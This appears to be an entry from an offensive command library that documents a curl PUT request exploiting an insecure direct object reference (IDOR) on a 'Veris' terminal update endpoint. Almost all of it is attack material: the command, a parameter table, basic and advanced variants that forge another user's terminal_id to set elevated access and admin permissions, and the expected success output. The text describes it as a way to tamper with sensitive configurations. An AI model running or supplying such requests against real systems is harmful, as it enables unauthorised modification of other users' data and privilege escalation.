---
data: >-
  curl -X PUT -H "Authorization: Bearer your_auth_token" -H "Content-Type:
  application/json" -d '{"terminal_id": "target_user_terminal_id",
  "gatekeeper_data": {"config_key": "malicious_or_modified_value"}}'
  https://veris.example.com/api/terminal/update
tags:
  - web
  - http
  - exploit
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.292Z'
id: a7e5b9ed-23bb-4733-8726-4b2defb3fa7b
verified: false
validated: true
submitted: true
---
# curl-put-modify-terminal

## Command

```bash
curl -X PUT -H "Authorization: Bearer your_auth_token" -H "Content-Type: application/json" -d '{"terminal_id": "target_user_terminal_id", "gatekeeper_data": {"config_key": "malicious_or_modified_value"}}' https://veris.example.com/api/terminal/update
```

## Description

This curl command performs a PUT request to the Veris terminal update endpoint, exploiting IDOR by specifying a target user's terminal_id to modify their gatekeeper data without authorization. Use it to tamper with sensitive configurations in web applications vulnerable to direct object references.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | Specifies the HTTP PUT method for updating resources | Yes |
| `-H "Authorization: Bearer your_auth_token"` | Provides the authenticated session token | Yes |
| `-H "Content-Type: application/json"` | Sets the request body format to JSON | Yes |
| `-d 'payload'` | JSON data with forged terminal_id and modified values | Yes |
| `https://veris.example.com/api/terminal/update` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT -H "Authorization: Bearer abc123" -H "Content-Type: application/json" -d '{"terminal_id": "456", "gatekeeper_data": {"access": "elevated"}}' https://veris.example.com/api/terminal/update
```

### Advanced Usage

```bash
curl -X PUT -H "Authorization: Bearer abc123" -H "Content-Type: application/json" -d '{"terminal_id": "456", "gatekeeper_data": {"config_key": "malicious_value", "permissions": ["admin"]}}' -v https://veris.example.com/api/terminal/update
```

## Expected Output

Successful execution returns an HTTP 200 OK response, such as `{"status": "success", "message": "Terminal updated"}`. Failure due to auth would be 401/403, but in IDOR cases, it succeeds silently.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-to-Modify-User-Terminal-Data-in-Veris]]
